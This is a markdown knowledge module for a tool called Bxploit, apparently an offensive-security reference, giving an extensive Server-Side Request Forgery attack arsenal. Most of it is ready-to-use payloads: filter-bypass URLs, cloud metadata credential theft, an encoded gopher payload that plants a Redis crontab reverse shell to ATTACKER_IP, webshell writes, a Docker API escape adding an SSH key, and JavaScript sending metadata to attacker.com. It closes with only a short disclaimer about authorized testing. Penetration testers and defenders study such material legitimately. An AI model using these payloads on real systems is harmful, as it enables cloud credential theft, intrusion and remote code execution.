# SSRF Complete Arsenal

> Knowledge module for Bxploit (bx) — Server-Side Request Forgery from basic to advanced exploitation.

## Overview

SSRF occurs when an attacker can make the server-side application issue HTTP requests to an arbitrary domain, IP, or protocol of the attacker's choosing. It is one of the most impactful web vulnerabilities, enabling cloud metadata theft, internal network pivoting, and full RCE chains.

---

## 1. Basic SSRF — Direct Response

### 1.1 Common Injection Points

```
# URL parameters
GET /fetch?url=http://169.254.169.254/latest/meta-data/
GET /proxy?img=http://internal-server:8080/admin
POST /api/webhook  {"url": "http://127.0.0.1:6379/"}

# File import / upload by URL
POST /import {"source_url": "http://localhost:3000/secret"}

# PDF generators (wkhtmltopdf, Puppeteer, WeasyPrint)
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>

# SVG image loads
<image href="http://internal:8080/admin" />

# XML external entity + SSRF
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

### 1.2 Testing for Basic SSRF

```bash
# Quick detection with Burp Collaborator / interactsh
curl -s "https://target.com/fetch?url=http://BURP_COLLAB_ID.burpcollaborator.net"

# interactsh-client for OOB detection
interactsh-client -v 2>&1 &
curl "https://target.com/fetch?url=http://INTERACTSH_ID.oast.pro"

# Using ffuf to fuzz SSRF parameters
ffuf -u "https://target.com/FUZZ=http://attacker.com" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 0

# Common parameters to test
# url, uri, path, dest, redirect, rurl, src, source, img, image,
# feed, host, site, html, data, reference, ref, callback, next,
# link, to, out, view, dir, show, navigation, open, file, val,
# validate, domain, return, page, window, load, request
```

---

## 2. Bypass Techniques — Evading Filters and WAFs

### 2.1 IP Address Obfuscation

```bash
# Decimal encoding (127.0.0.1)
http://2130706433/               # Full decimal
http://0x7f000001/               # Hex
http://017700000001/             # Octal
http://0x7f.0x0.0x0.0x1/        # Dotted hex
http://0177.0.0.01/             # Dotted octal
http://127.1/                   # Short form
http://127.0.1/                 # Another short form
http://0/                       # 0.0.0.0

# IPv6 representations of localhost
http://[::1]/
http://[0000::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:7f00:1]/
http://[::ffff:7f00:1]/

# Encoded forms
http://%31%32%37%2e%30%2e%30%2e%31/   # URL-encoded 127.0.0.1
http://127。0。0。1/                    # Fullwidth dots (Unicode)
http://127%E3%80%820%E3%80%820%E3%80%821/

# Rare but effective
http://127.0.0.1.nip.io/              # DNS wildcard service
http://localtest.me/                   # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/   # Custom DNS record
http://customer1.app.localhost/        # Subdomain of localhost
```

### 2.2 Protocol Smuggling & URL Parsing Tricks

```bash
# URL schema tricks
http://google.com@127.0.0.1/          # Userinfo bypass
http://127.0.0.1#@google.com/         # Fragment confusion
http://127.0.0.1%2523@google.com/     # Double-encode
http://google.com%00@127.0.0.1/       # Null byte

# CRLF injection in URL
http://127.0.0.1%0d%0aHost:%20internal.server/

# Backslash confusion (parser differentials)
http://google.com\@127.0.0.1/
http://127.0.0.1\/google.com/

# Port variations
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:8080/
http://127.0.0.1:0/

# Redirect-based bypass — host your own 302
# On attacker server:
# <?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
http://attacker.com/redirect.php

# URL shorteners as redirect bypass
http://tinyurl.com/XXXXX   # Pointing to internal target
```

### 2.3 DNS Rebinding

```bash
# Setup: Use rbndr.us or custom DNS server
# rbndr.us returns alternating IPs
# First resolution: attacker IP (passes allowlist)
# Second resolution: 169.254.169.254 (hits metadata)

http://7f000001.c0a80001.rbndr.us/    # Alternates 127.0.0.1 / 192.168.0.1

# singularity of origin — full DNS rebinding framework
git clone https://github.com/nccgroup/singularity.git
cd singularity
go build -o singularity cmd/singularity-server/main.go
./singularity -HTTPServerPort 8080 -DNSRebindStrategy round-robin \
  -ResponseIPAddr 169.254.169.254 -ResponseReboundIPAddr ATTACKER_IP

# whonow — DNS rebinding tool
# Install: go install github.com/brannondorsey/whonow@latest
# DNS query: A record for <rebind-ip>-<target-ip>.whonow.attacker.com
# Returns attacker IP first, then target IP

# Custom DNS rebinding via CoreDNS or dnsmasq
# Set low TTL (0-1 seconds) so the app re-resolves
```

---

## 3. Cloud Metadata Extraction

### 3.1 AWS (IMDSv1 & IMDSv2)

```bash
# === IMDSv1 (no auth, direct GET) ===
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# === IMDSv2 (requires PUT + token header) ===
# Step 1: Get token (requires PUT — difficult via pure SSRF but possible via Gopher)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# === Using stolen AWS creds ===
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws iam list-roles
aws lambda list-functions
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path "/" --recursive

# ECS metadata (container credentials)
http://169.254.170.2/v2/credentials/GUID
# ECS task metadata
http://169.254.170.2/v2/metadata

# Lambda environment (via env vars leaked through SSRF)
# AWS_LAMBDA_FUNCTION_NAME, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
```

### 3.2 Google Cloud Platform (GCP)

```bash
# GCP metadata requires "Metadata-Flavor: Google" header
# But some SSRF endpoints allow header injection

# Without header (sometimes works on older endpoints)
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# With header (header injection needed)
# Via CRLF in URL:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:%20Google%0d%0a

# Key endpoints
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Recursive listing
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json

# Using stolen GCP token
curl -H "Authorization: Bearer ACCESS_TOKEN" \
  https://www.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances
```

### 3.3 Microsoft Azure

```bash
# Azure IMDS — requires "Metadata: true" header
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Access token for Azure services
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/

# Using stolen Azure token
curl -H "Authorization: Bearer TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Azure App Service (alternative endpoints)
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```

### 3.4 DigitalOcean

```bash
# DigitalOcean metadata (no auth header required)
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/
http://169.254.169.254/metadata/v1/dns/nameservers
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/vendor-data
http://169.254.169.254/metadata/v1/reserved_ip/ipv4/ip_address

# Full JSON dump
http://169.254.169.254/metadata/v1.json
```

### 3.5 Other Cloud Providers

```bash
# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v2/instance/  # Requires Authorization header

# Kubernetes (if SSRF from within a pod)
https://kubernetes.default.svc/api/v1/namespaces/default/secrets/
# Token at: /var/run/secrets/kubernetes.io/serviceaccount/token
# CA at: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Rancher metadata
http://rancher-metadata/latest/

# Docker API (if Docker socket exposed via TCP)
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json
http://127.0.0.1:2375/info
```

---

## 4. Gopher Protocol Attacks

Gopher (`gopher://`) allows sending raw TCP data, making it extremely powerful for SSRF chains to internal services that speak line-based protocols.

### 4.1 Gopher Basics

```bash
# Gopher URL format:
# gopher://host:port/_<URL-encoded-data>
# The underscore after / is consumed by gopher; actual data follows

# Generate gopher payloads with gopherus
pip3 install gopherus
# or
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus && python3 gopherus.py
```

### 4.2 SSRF to Redis RCE via Gopher

```bash
# === Redis — Write crontab for reverse shell ===
# Raw Redis commands:
# FLUSHALL
# SET shell "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
# CONFIG SET dir /var/spool/cron/crontabs
# CONFIG SET dbfilename root
# SAVE
# QUIT

# Generate with gopherus:
python3 gopherus.py --exploit redis

# Manual gopher payload (URL-encoded RESP protocol):
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Ashell%0D%0A%2468%0D%0A%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER%2F4444%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2425%0D%0A%2Fvar%2Fspool%2Fcron%2Fcrontabs%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A

# === Redis — Write SSH key ===
# CONFIG SET dir /root/.ssh
# CONFIG SET dbfilename authorized_keys
# SET sshkey "\n\nssh-rsa AAAA...KEY... attacker@box\n\n"
# SAVE

# === Redis — Write webshell ===
# CONFIG SET dir /var/www/html
# CONFIG SET dbfilename shell.php
# SET webshell "<?php system($_GET['cmd']); ?>"
# SAVE

# === Redis — Module load (Redis >= 4.0) ===
# MODULE LOAD /tmp/exp.so     (after uploading malicious .so)
# Use redis-rogue-server for automated RCE:
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
python3 redis-rogue-server.py --rhost 127.0.0.1 --lhost ATTACKER_IP
```

### 4.3 SSRF to Memcached RCE via Gopher

```bash
# Memcached — Inject serialized objects (PHP, Python, Java)
# Memcached speaks a simple text protocol on port 11211

# PHP object injection via Memcached
# set <key> <flags> <exptime> <bytes>\r\n<data>\r\n
# Payload: serialized PHP object that triggers __destruct or __wakeup

# Generate with gopherus:
python3 gopherus.py --exploit phpmemcache
# Enter PHP reverse shell payload when prompted

# Manual gopher payload for Memcached:
gopher://127.0.0.1:11211/_%0D%0Aset%20SpyD3r%200%20999999%2070%0D%0AO:14:%22BadClass%22:1:{s:4:%22data%22;s:33:%22<?php%20system($_GET['cmd']);%20?>%22;}%0D%0A

# Dump Memcached keys
gopher://127.0.0.1:11211/_%0D%0Astats%20items%0D%0A
gopher://127.0.0.1:11211/_%0D%0Astats%20cachedump%201%200%0D%0A
```

### 4.4 Gopher to SMTP (Email Sending)

```bash
# Send email via internal SMTP (port 25)
# Generate with gopherus:
python3 gopherus.py --exploit smtp

# Manual payload:
gopher://127.0.0.1:25/_HELO%20attacker%0D%0AMAIL%20FROM:%3Cattacker@evil.com%3E%0D%0ARCPT%20TO:%3Cvictim@target.com%3E%0D%0ADATA%0D%0ASubject:%20SSRF%20PoC%0D%0A%0D%0ASSRF%20to%20SMTP%20works%0D%0A.%0D%0AQUIT%0D%0A
```

### 4.5 Gopher to MySQL (Unauthenticated)

```bash
# Works when MySQL allows passwordless login (root@localhost, no password)
# Generate with gopherus:
python3 gopherus.py --exploit mysql
# Enter: username = root, query = SELECT system_user();

# Can execute:
# SELECT ... INTO OUTFILE '/var/www/html/shell.php'
# To write a webshell
```

### 4.6 Gopher to FastCGI/PHP-FPM (Port 9000)

```bash
# Extremely powerful — direct PHP code execution
# Generate with gopherus:
python3 gopherus.py --exploit fastcgi
# Enter: path to a known PHP file (e.g., /usr/share/php/PEAR.php)
# Enter: command to execute

# This crafts a FastCGI record that sets PHP_VALUE to:
# auto_prepend_file = php://input
# And sends PHP code in the body

# Alternative tool — fcgi_exp
git clone https://github.com/piaca/fcgi_exp.git
go build
./fcgi_exp -addr 127.0.0.1:9000 -phpfile /var/www/html/index.php \
  -cmd "id; cat /etc/passwd"
```

---

## 5. Blind SSRF — Techniques for No Direct Response

### 5.1 OOB Detection

```bash
# interactsh (preferred — self-hosted, reliable)
interactsh-client -v
# Use generated subdomain in SSRF payload

# Burp Collaborator
# Use provided *.burpcollaborator.net subdomain

# webhook.site (quick and dirty)
# Visit https://webhook.site — use unique URL

# requestbin / pipedream
# https://pipedream.com — free HTTP bin

# DNS-based exfil via OOB
http://$(cat /etc/hostname).attacker.com/
# Or via SSRF:
http://target.com/fetch?url=http://ssrf-detected.UNIQUE.attacker.com/
```

### 5.2 Time-Based Detection

```bash
# Compare response times
# Internal host exists + port open: fast response
# Internal host exists + port closed: connection refused (fast)
# Non-existent host: DNS timeout (slow ~5-30s)
# Filtered port: TCP timeout (slow ~10-30s)

# Automate timing-based detection
for port in 80 443 8080 8443 3000 5000 6379 27017 3306 5432 9200; do
  START=$(date +%s%N)
  curl -s -o /dev/null -m 5 "https://target.com/fetch?url=http://127.0.0.1:${port}/"
  END=$(date +%s%N)
  ELAPSED=$(( (END - START) / 1000000 ))
  echo "Port ${port}: ${ELAPSED}ms"
done
```

### 5.3 Blind SSRF → Data Exfiltration

```bash
# DNS exfiltration of internal data
# If you can control partial URL:
http://$(cat /etc/passwd | base64 | head -c 60).attacker.com/
# Via SSRF parameter:
url=http://INTERNAL_DATA_HERE.attacker.com

# Error-based exfil
# Some apps reflect the error message including response body
url=http://127.0.0.1:6379/   # Redis RESP protocol errors may leak data

# Redirect chain for detection
# 1. SSRF hits attacker server
# 2. Attacker server 302 redirects to http://169.254.169.254/
# 3. If app follows redirect, metadata is fetched
# 4. Even if response isn't shown, the redirect confirms SSRF
```

---

## 6. Internal Port Scanning via SSRF

### 6.1 Manual Scanning

```bash
# Scan common internal IPs
for ip in 127.0.0.1 10.0.0.1 10.0.0.2 172.17.0.1 172.17.0.2 192.168.1.1; do
  for port in 22 80 443 3000 3306 5432 6379 8080 8443 9200 27017; do
    curl -s -o /dev/null -w "%{http_code} %{time_total}" \
      "https://target.com/fetch?url=http://${ip}:${port}/" &
  done
done
wait
```

### 6.2 Automated Scanning with ffuf

```bash
# Generate port list
seq 1 65535 > ports.txt

# Scan localhost ports via SSRF
ffuf -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ/" \
  -w ports.txt -t 50 -timeout 3 \
  -fs 0 -fc 500

# Scan internal /24 subnet
for i in $(seq 1 254); do echo "192.168.1.$i"; done > ips.txt
ffuf -u "https://target.com/fetch?url=http://FUZZ:80/" \
  -w ips.txt -t 20 -timeout 3 \
  -fs 0 -mc all -fc 500

# Detect internal services by response size differential
ffuf -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ/" \
  -w ports.txt -t 50 -timeout 5 \
  -ac   # Auto-calibrate filter (removes uniform responses)
```

### 6.3 Interesting Internal Targets

```
# Common internal services to probe
127.0.0.1:6379    # Redis
127.0.0.1:11211   # Memcached
127.0.0.1:27017   # MongoDB
127.0.0.1:9200    # Elasticsearch
127.0.0.1:9300    # Elasticsearch (transport)
127.0.0.1:5601    # Kibana
127.0.0.1:2375    # Docker API (HTTP)
127.0.0.1:2376    # Docker API (HTTPS)
127.0.0.1:8500    # Consul
127.0.0.1:8200    # Vault
127.0.0.1:4040    # Spark
127.0.0.1:8088    # YARN ResourceManager
127.0.0.1:50070   # HDFS NameNode
127.0.0.1:10250   # Kubelet API
127.0.0.1:10255   # Kubelet read-only
127.0.0.1:2379    # etcd
127.0.0.1:3000    # Grafana / Gitea
127.0.0.1:9090    # Prometheus
127.0.0.1:15672   # RabbitMQ Management
127.0.0.1:5672    # RabbitMQ AMQP
127.0.0.1:1099    # Java RMI
127.0.0.1:8000    # Generic dev server
127.0.0.1:4848    # GlassFish admin
127.0.0.1:7001    # WebLogic
127.0.0.1:9043    # WebSphere admin
127.0.0.1:8161    # ActiveMQ web console
172.17.0.1:*      # Docker host from container
```

---

## 7. PDF / Image Generation SSRF

### 7.1 HTML-to-PDF Engines (wkhtmltopdf, Puppeteer, Chrome Headless)

```html
<!-- Basic SSRF via embedded content -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600"></iframe>
<img src="http://169.254.169.254/latest/meta-data/">
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
<script src="http://169.254.169.254/latest/meta-data/"></script>
<object data="http://169.254.169.254/latest/meta-data/"></object>
<embed src="http://169.254.169.254/latest/meta-data/">
<base href="http://169.254.169.254/">

<!-- JavaScript fetch for more control (Puppeteer/Chrome) -->
<script>
  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
    .then(r => r.text())
    .then(d => {
      // Exfil via DNS
      new Image().src = 'http://' + btoa(d).substring(0,60) + '.attacker.com';
      // Or render in document for PDF capture
      document.body.innerText = d;
    });
</script>

<!-- XMLHttpRequest variant -->
<script>
  var x = new XMLHttpRequest();
  x.open('GET', 'http://169.254.169.254/latest/meta-data/', false);
  x.send();
  document.write('<pre>' + x.responseText + '</pre>');
</script>

<!-- Read local files via file:// (if not blocked) -->
<iframe src="file:///etc/passwd"></iframe>
<script>
  var x = new XMLHttpRequest();
  x.open('GET', 'file:///etc/passwd', false);
  x.send();
  document.write('<pre>' + x.responseText + '</pre>');
</script>

<!-- Chained: read internal then exfil -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://169.254.169.254/latest/user-data', false);
  xhr.send();
  // POST exfil to attacker
  var exfil = new XMLHttpRequest();
  exfil.open('POST', 'https://attacker.com/collect', false);
  exfil.send(xhr.responseText);
</script>
```

### 7.2 SVG-Based SSRF

```xml
<!-- SVG with external image load -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="500" height="500">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="500" height="500"/>
</svg>

<!-- SVG with foreignObject (renders HTML inside SVG) -->
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <foreignObject width="500" height="500">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="http://169.254.169.254/latest/meta-data/" width="500" height="500"/>
    </body>
  </foreignObject>
</svg>

<!-- SVG with external stylesheet -->
<?xml version="1.0"?>
<?xml-stylesheet type="text/css" href="http://169.254.169.254/"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100"/>
</svg>
```

### 7.3 WeasyPrint Specific

```html
<!-- WeasyPrint follows CSS @import and url() -->
<style>
  @import url('http://169.254.169.254/latest/meta-data/');
</style>

<!-- CSS url() function -->
<style>
  body { background: url('http://169.254.169.254/latest/meta-data/'); }
</style>

<!-- WeasyPrint also supports <link> and attachment URLs -->
<link rel="attachment" href="http://169.254.169.254/latest/meta-data/">
```

---

## 8. Webhook SSRF

### 8.1 Common Webhook Targets

```bash
# Slack incoming webhook URLs
# Discord webhook URLs
# GitHub/GitLab webhook URLs
# Custom application webhooks

# Attack: register a webhook pointing to internal services
POST /api/webhooks
{
  "url": "http://127.0.0.1:6379/",
  "events": ["user.created"]
}

# When the app sends the webhook, it hits Redis internally
# The POST body becomes Redis commands if formatted correctly

# Webhook URL pointing to cloud metadata
POST /api/integrations/webhook
{
  "callback_url": "http://169.254.169.254/latest/meta-data/"
}
```

### 8.2 Webhook Smuggling via Request Body

```bash
# If the webhook sends a POST with JSON body, some services
# may interpret the body as commands

# Example: Webhook hits Elasticsearch
{
  "url": "http://127.0.0.1:9200/_search",
  "method": "POST",
  "body": {"query": {"match_all": {}}}
}

# Webhook to Docker API — create container
{
  "url": "http://127.0.0.1:2375/containers/create",
  "method": "POST",
  "body": {
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /etc/shadow > /mnt/host/tmp/shadow"],
    "Binds": ["/:/mnt/host"]
  }
}
```

---

## 9. Advanced SSRF Chains

### 9.1 SSRF → RCE via Internal Services

```bash
# Chain 1: SSRF → Redis → Crontab → Reverse Shell
# 1. Discover Redis via port scan
# 2. Use gopher to write crontab
# 3. Catch reverse shell

# Chain 2: SSRF → Docker API → Container Escape → Host RCE
# 1. Hit http://127.0.0.1:2375/containers/create
# 2. Mount host filesystem
# 3. Write crontab or SSH key on host
curl -X POST "http://127.0.0.1:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh","-c","echo ATTACKER_KEY >> /mnt/.ssh/authorized_keys"],"Binds":["/root:/mnt"],"HostConfig":{"Binds":["/root:/mnt"]}}'
# Then start it:
curl -X POST "http://127.0.0.1:2375/containers/CONTAINER_ID/start"

# Chain 3: SSRF → Consul → RCE via service registration
# Register a service with a script check
curl "http://127.0.0.1:8500/v1/agent/service/register" \
  -X PUT -d '{"ID":"rce","Name":"rce","Address":"127.0.0.1","Port":80,"Check":{"Script":"id > /tmp/pwned","Interval":"10s"}}'

# Chain 4: SSRF → Kubernetes API → Pod Creation → RCE
# If the SSRF can reach the Kubernetes API with a privileged service account
http://127.0.0.1:10250/run/default/POD_NAME/CONTAINER_NAME?cmd=id

# Chain 5: SSRF → Elasticsearch → Script Execution (old versions)
http://127.0.0.1:9200/_search?source={"query":{"match_all":{}},"script_fields":{"cmd":{"script":"Runtime.getRuntime().exec('id')"}}}

# Chain 6: SSRF → etcd → Secret Extraction
http://127.0.0.1:2379/v2/keys/?recursive=true
```

### 9.2 SSRF to NTLM Relay (Windows)

```bash
# Force the server to authenticate to attacker's SMB/HTTP
# Capture NTLMv2 hash or relay it

# Start Responder or ntlmrelayx
sudo responder -I eth0 -v

# SSRF payload (triggers NTLM auth via UNC path or HTTP)
http://target.com/fetch?url=http://ATTACKER_IP/   # HTTP NTLM
file://ATTACKER_IP/share                            # SMB UNC
\\ATTACKER_IP\share                                 # UNC path

# Relay with ntlmrelayx
sudo ntlmrelayx.py -t smb://DC_IP -smb2support
```

---

## 10. SSRF via Specific Technologies

### 10.1 SSRF in Common Libraries

```
# Python requests — follows redirects by default
# Node.js axios — follows redirects by default
# Java HttpURLConnection — follows redirects, supports jar: protocol
# PHP file_get_contents — supports php://, data://, expect://
# PHP curl — supports dict://, gopher://, tftp://
# Ruby open-uri — supports | for command execution (older versions)
# Perl LWP — supports various protocols
```

### 10.2 Protocol-Specific Payloads

```bash
# dict:// protocol (info leakage from dict servers)
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats

# tftp:// protocol
tftp://attacker.com/file

# jar:// protocol (Java-specific — triggers file download + extraction)
jar:http://attacker.com/evil.jar!/path/to/file.class

# ldap:// protocol (JNDI injection surface)
ldap://attacker.com/exploit

# netdoc:// protocol (Java — read local files)
netdoc:///etc/passwd

# php:// wrappers (when SSRF is through PHP)
php://filter/convert.base64-encode/resource=http://169.254.169.254/
```

### 10.3 SSRF in GraphQL

```graphql
# If GraphQL endpoint has a query that fetches URLs
mutation {
  importData(url: "http://169.254.169.254/latest/meta-data/") {
    result
  }
}

# Or via introspection to find URL-accepting fields
query {
  __schema {
    types {
      name
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
```

---

## 11. Tools & Automation

### 11.1 Dedicated SSRF Tools

```bash
# SSRFmap — automatic SSRF exploitation
git clone https://github.com/swisskyrepo/SSRFmap.git
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m redis
python3 ssrfmap.py -r request.txt -p url -m fastcgi

# Gopherus — gopher payload generator
python3 gopherus.py --exploit redis
python3 gopherus.py --exploit fastcgi
python3 gopherus.py --exploit mysql
python3 gopherus.py --exploit smtp
python3 gopherus.py --exploit zabbix
python3 gopherus.py --exploit phpmemcache
python3 gopherus.py --exploit pymemcache
python3 gopherus.py --exploit dmpmemcache
python3 gopherus.py --exploit rbmemcache

# ground-control — callback/rebinding server
# https://github.com/nicholasgasior/ground-control

# SSRF-Testing — SSRF bible payloads
git clone https://github.com/cujanovic/SSRF-Testing.git
```

### 11.2 Wordlists & Resources

```bash
# SecLists SSRF payloads
/usr/share/seclists/Fuzzing/SSRFmap.txt
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# SSRF-specific bypass lists
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

# Cloud metadata wordlists
# AWS: /latest/meta-data/ (recursive crawl)
# GCP: /computeMetadata/v1/ with ?recursive=true
# Azure: /metadata/instance?api-version=2021-02-01

# Internal IP ranges to scan
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.0.0/16
127.0.0.0/8
```

---

## 12. Defense Evasion Checklist

| Technique | When to Use |
|-----------|-------------|
| Decimal IP (`2130706433`) | Regex blocks `127.0.0.1` literally |
| IPv6 `[::1]` | Only IPv4 is blocked |
| DNS rebinding | Allowlist checks DNS, but app re-resolves |
| URL redirect (302) | App validates URL but follows redirects |
| URL encoding (`%31%32%37`) | Naive string matching on URL |
| CRLF injection | Need custom headers (GCP, Azure) |
| `@` userinfo (`evil.com@127.0.0.1`) | Parser uses hostname after `@` |
| Alternate protocols (`gopher://`, `dict://`) | HTTP is blocked but others aren't |
| `nip.io` / `xip.io` wildcard DNS | IP addresses blocked, but DNS allowed |
| Double URL encoding | App decodes once, WAF checks once |
| Case variation (`HTTP`, `hTtP`) | Case-sensitive protocol checks |
| Backslash (`\`) in URL | Parser differential between validator and fetcher |
| Null byte in hostname | C-based parsers truncate at `\0` |

---

## 13. Quick Reference — SSRF Decision Tree

```
1. Can you see the response?
   ├── YES → Basic SSRF
   │   ├── Try cloud metadata endpoints
   │   ├── Try file:///etc/passwd
   │   └── Try internal service endpoints
   └── NO → Blind SSRF
       ├── Use OOB (interactsh, Collaborator)
       ├── Use timing-based detection
       └── Use DNS exfiltration

2. What protocols are allowed?
   ├── HTTP/HTTPS only
   │   ├── Redirect-based bypass
   │   ├── DNS rebinding
   │   └── Internal HTTP services
   ├── gopher://
   │   ├── Redis → RCE
   │   ├── FastCGI → RCE
   │   ├── MySQL → data exfil / webshell
   │   ├── Memcached → object injection
   │   └── SMTP → phishing / relay
   └── dict://, file://, jar://, etc.
       └── Protocol-specific attacks

3. Is it in the cloud?
   ├── AWS → 169.254.169.254 (IMDSv1 easy, v2 harder)
   ├── GCP → metadata.google.internal (needs header)
   ├── Azure → 169.254.169.254 (needs header)
   └── DO → 169.254.169.254 (no auth)

4. Can you chain to RCE?
   ├── Redis (write crontab, SSH key, webshell, module load)
   ├── Docker API (create container with host mount)
   ├── Consul (script check)
   ├── Kubernetes (exec into pod)
   └── FastCGI (direct code execution)
```

---

## Disclaimer

This knowledge module is for **authorized penetration testing and security research only**. Always obtain proper authorization before testing. Unauthorized access to computer systems is illegal.
